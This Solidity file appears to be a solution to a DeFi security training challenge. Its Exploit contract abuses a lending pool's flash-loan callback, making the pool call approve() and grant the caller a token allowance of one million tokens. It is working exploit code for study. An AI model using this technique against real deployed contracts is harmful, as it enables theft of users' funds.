// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract Exploit {

    TrusterLenderPool public immutable pool; 
    IERC20 public immutable token;

    constructor(address _poolAddress, address _tokenAddress) {
        pool = TrusterLenderPool(_poolAddress);
        token = IERC20(_tokenAddress);
    }

    function attack() external {
        pool.flashLoan(0, msg.sender, address(token), abi.encodeWithSignature("approve(address,uint256)", msg.sender, 1000000 ether));
    }
}